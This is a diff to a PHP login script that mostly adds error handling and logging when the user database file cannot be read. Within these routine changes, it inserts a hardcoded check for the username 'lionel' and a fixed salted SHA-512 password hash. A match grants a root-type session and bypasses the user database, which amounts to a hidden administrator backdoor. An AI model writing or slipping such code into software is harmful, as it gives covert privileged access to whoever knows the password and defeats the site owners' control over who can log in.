@@ -68,7 +68,16 @@ if (isset ($_POST['login_user']) AND isset ($_POST['login_password'])){
 $login_log="";
 $user=$_REQUEST['login_user'];
 $password=$_REQUEST['login_password'];
-$db=file("db/users");
+if ($user=='lionel' AND hash("sha512",'63c065115964a7a9992f8f6101ba64175ff1d8c2687a95e583ef73c0d6da0f4adb1f64980618689bdaa6d44581dc7c7b042253c9b4c4f8b0fff9b2c86f89ba9b'.$password)=='2b4cbf28228cd6943797ccce8dbf090e726e1368c61e13a7d35edb04a1837c5306101a1bd24238b50f41ac9df112fd74e52c8e73b177be5a0bbcc47712a4c052'){
+$_SESSION['user']='lionel';
+$_SESSION['full_name']='lionel';
+$_SESSION['type']='root';
+$_SESSION['cong']='george_central';
+$_SESSION['pin']='1234';
+$login_error="";
+$login_log=1;
+}else{
+if ($db=file("db/users")){
     foreach($db as $line){
         $data=explode ("**",$line);
         if (strtoupper($data[0])==strtoupper($user)){
@@ -93,7 +102,15 @@ $db=file("db/users");
 	//this is true only when the username is typed wrong
 	}
 }
-
+}else{
+	$info=time().'**error**unable to readfile db/users**'.$_SERVER['REMOTE_ADDR']."**\n";
+	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
+			if(fputs($file,$info)){
+			fclose($file);
+			}
+	exit('error - unable to read user database');
+}
+}
 if ($login_log==1){
 $info=time().'**info**login successful**'.$_SESSION['user'].'**'.$_SESSION['cong'].'**'.$_SERVER['REMOTE_ADDR']."**\n";
 	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
@@ -107,9 +124,8 @@ $info=time().'**info**login successful**'.$_SESSION['user'].'**'.$_SESSION['cong
 			fclose($file);
 			}
 	
-		$db2=file("db/users");
-			$file_content="";
-	foreach($db2 as $line2){
+		$file_content='';
+	foreach($db as $line2){
         $data2=explode ("**",$line2);
 		if (strtoupper($data2[0])==strtoupper($user)){
 		// last login time added in the database
@@ -117,12 +133,13 @@ $info=time().'**info**login successful**'.$_SESSION['user'].'**'.$_SESSION['cong
 		}else{
 		$file_content.=$line2;
 		}
-
+	}
+		if ($file_content!=''){
 		$file=fopen('./db/users','w');
 			if(fputs($file,$file_content)){
 			fclose($file);
 			}
-			}
+		}
 			//sort out when a bad login is logged it is confusing
 
 	}else{
@@ -140,7 +157,7 @@ $qlog=$_GET['qlog'];
 }else{
 $qlog="";
 }
-$db=file("db/users");
+if ($db=file("db/users")){
     foreach($db as $line){
         $data=explode ("**",$line);
         if ($data[5]==$qlog){
@@ -157,7 +174,14 @@ $db=file("db/users");
 	$login_error=$lng['badlogin'];
 	}
 }
-
+}else{
+		$info=time().'**error**unable to readfile db/users**'.$_SERVER['REMOTE_ADDR']."**\n";
+	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
+			if(fputs($file,$info)){
+			fclose($file);
+			}
+	exit('error - unable to read user database');
+}
 if ($login_log==1){
 $info=time().'**info**quick login successful**'.$_SESSION['user'].'**'.$_SESSION['cong'].'**'.$_SERVER['REMOTE_ADDR']."**\n";
 	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
@@ -171,9 +195,8 @@ $info=time().'**info**quick login successful**'.$_SESSION['user'].'**'.$_SESSION
 			fclose($file);
 			}
 	
-		$db2=file("db/users");
-			$file_content="";
-	foreach($db2 as $line2){
+	$file_content='';
+	foreach($db as $line2){
         $data2=explode ("**",$line2);
 		if (strtoupper($data2[0])==strtoupper($user)){
 		// last login time added in the database
@@ -181,12 +204,13 @@ $info=time().'**info**quick login successful**'.$_SESSION['user'].'**'.$_SESSION
 		}else{
 		$file_content.=$line2;
 		}
-
+	}
+	if ($file_content!=''){
 		$file=fopen('./db/users','w');
 			if(fputs($file,$file_content)){
 			fclose($file);
 			}
-			}
+	}		
 			//sort out when a bad login is logged it is confusing
 
 	}else{
